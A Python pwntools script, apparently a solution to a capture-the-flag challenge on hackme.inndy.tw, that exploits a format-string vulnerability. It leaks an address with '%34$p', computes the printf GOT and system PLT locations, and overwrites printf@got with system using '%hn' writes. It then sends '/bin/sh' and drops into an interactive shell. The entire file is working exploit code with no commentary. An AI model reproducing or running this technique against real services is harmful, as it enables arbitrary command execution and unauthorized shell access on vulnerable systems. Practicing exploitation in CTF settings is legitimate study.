from pwn import *
import sys

#r = remote("localhost", 5566)
r = remote("hackme.inndy.tw", 7712)

payload = "%34$p"

r.sendline(payload)

_start_addr = r.recvline()
_start_addr = _start_addr[:len(_start_addr)-1]
printf_got_addr = hex(int(_start_addr, 16) + int("0x200810", 16))
system_plt_addr = hex(int(_start_addr, 16) - int("0x80", 16))

print "_start     : " + _start_addr
print "printf@got : " + printf_got_addr
print "system@plt : " + system_plt_addr

printf_got_addr = printf_got_addr[2:]
printf_got_addr = "0"*(16 - len(printf_got_addr))+printf_got_addr
printf_got_addr = "0x" + printf_got_addr
printf_got_addr = int(printf_got_addr, 16)

system_plt_addr_0 = "0x" + system_plt_addr[2:len(system_plt_addr)-8]
system_plt_addr_1 = "0x" + system_plt_addr[len(system_plt_addr_0):len(system_plt_addr_0)+4]
system_plt_addr_2 = "0x" + system_plt_addr[len(system_plt_addr_0)+4:]

system_plt_addr_0 = str(int(system_plt_addr_0, 16))
system_plt_addr_1 = str(int(system_plt_addr_1, 16))
system_plt_addr_2 = str(int(system_plt_addr_2, 16))

needReverse = False
if int(system_plt_addr_1) > int(system_plt_addr_2):
    temp = system_plt_addr_1
    system_plt_addr_1 = system_plt_addr_2
    system_plt_addr_2 = temp
    needReverse = True
    

offset_1 = str(int(system_plt_addr_1) - int(system_plt_addr_0))
offset_2 = str(int(system_plt_addr_2) - int(system_plt_addr_1))

A0_padding = 8 - 2 - len(system_plt_addr_0)
temp = len(system_plt_addr_0)
system_plt_addr_0 = str(int(system_plt_addr_0) - 2 - A0_padding)
temp2 = len(system_plt_addr_0)
if temp != temp2:
    A0_padding += 1
    system_plt_addr_0 = str(int(system_plt_addr_0) - 1)

A1_padding = 8 - 2 - len(offset_1)
temp = len(offset_1)
offset_1 = str(int(offset_1) - 2 - A1_padding)
temp2 = len(offset_1)
if temp != temp2:
    A1_padding += 1
    offset_1 = str(int(offset_1) - 1 )

A2_padding = 8 - 2 - len(offset_2)
temp = len(offset_2)
offset_2 = str(int(offset_2) - 2 - A2_padding)
temp2 = len(offset_2)
if temp != temp2:
    A2_padding += 1
    offset_2 = str(int(offset_2) - 1 )

payload2 = "A"*A0_padding + "%" + system_plt_addr_0 + "x"
payload2 += "AA%12$hn"
if needReverse:
    payload2 += "A"*A1_padding + "%" + offset_1 + "x"
    payload2 += "AA%13$hn"
    payload2 += "A"*A2_padding + "%" + offset_2 + "x"
    payload2 += "AA%14$hn"
else:
    payload2 += "A"*A1_padding + "%" + offset_1 + "x"
    payload2 += "AA%14$hn"
    payload2 += "A"*A2_padding + "%" + offset_2 + "x"
    payload2 += "AA%13$hn"

print payload2

payload2 += p64(printf_got_addr+0x4)
payload2 += p64(printf_got_addr)
payload2 += p64(printf_got_addr+0x2)

payload3 = "/bin/sh"

r.sendline(payload2)
r.recvn(1)
r.sendline(payload3)

r.interactive()
